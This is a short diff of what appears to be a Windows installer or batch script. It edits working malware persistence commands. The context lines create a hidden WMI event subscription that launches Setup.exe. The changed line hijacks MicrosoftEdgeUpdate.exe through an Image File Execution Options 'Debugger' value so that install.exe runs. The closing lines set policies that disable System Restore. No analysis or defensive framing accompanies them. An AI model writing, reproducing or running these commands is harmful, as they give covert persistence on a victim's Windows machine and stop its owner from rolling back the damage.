@@ -35,7 +35,7 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-WmiInstance -Nam
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='SCM'; CommandLineTemplate='%WINDIR%\System32\cmd.exe /c start Setup.exe'} | Out-Null"
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='__EventFilter.Name=\"SCM\"'; Consumer='CommandLineEventConsumer.Name=\"SCM\"'} | Out-Null"
 
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "%WINDIR%\System32\cmd.exe /c start start.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "%WINDIR%\System32\cmd.exe /c start install.exe" /f
 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f
